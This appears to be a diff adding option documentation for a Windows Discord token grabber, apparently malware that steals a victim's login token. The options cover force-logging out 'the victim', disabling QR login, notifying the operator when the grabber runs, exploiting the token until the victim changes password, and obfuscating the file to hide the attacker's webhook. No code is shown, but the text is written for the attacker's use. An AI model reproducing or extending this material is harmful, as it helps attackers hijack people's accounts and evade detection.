@@ -1,0 +1,7 @@
+Platform: Windows only atm
+Logout: (If you want to logout the victim, Options: instant( Will kill discord and instantly restart), delayed(will not kill discord but the victim will get logged out after their next discord restart), false(wont logout at all))
+Disable-qr-code: (will disable the use of qr-code to login)
+InjectNotify (Will send info about the injection, if there's any, can be useful to know if they ran the grabber)
+LogoutNotify (You will get notified when the user is logged out)
+InitNotify (You will get notified when the script is initialized (good to be used with no restart at all so you know when you can start playing with their token and wait until they change password))
+Obfuscate: will obfuscate the file in order to make it a bit harder to fin your webhook
